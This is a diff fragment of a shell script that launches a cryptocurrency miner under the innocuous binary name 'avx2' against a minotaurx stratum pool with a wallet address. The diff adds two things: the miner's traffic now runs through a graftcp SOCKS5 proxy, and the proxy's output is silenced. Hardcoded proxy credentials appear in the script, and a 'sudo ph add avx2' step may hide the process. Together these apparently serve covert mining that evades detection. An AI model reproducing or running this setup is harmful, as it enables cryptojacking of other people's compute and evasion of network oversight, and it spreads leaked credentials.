@@ -25,7 +25,7 @@ socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf >/dev/null &
 
 sleep .2
 
@@ -39,4 +39,4 @@ chmod +x avx2
 
 sudo ph add avx2
 
-./avx2 -a minotaurx -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.tes -p x
+./graftcp/graftcp ./avx2 -a minotaurx -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.tes -p x
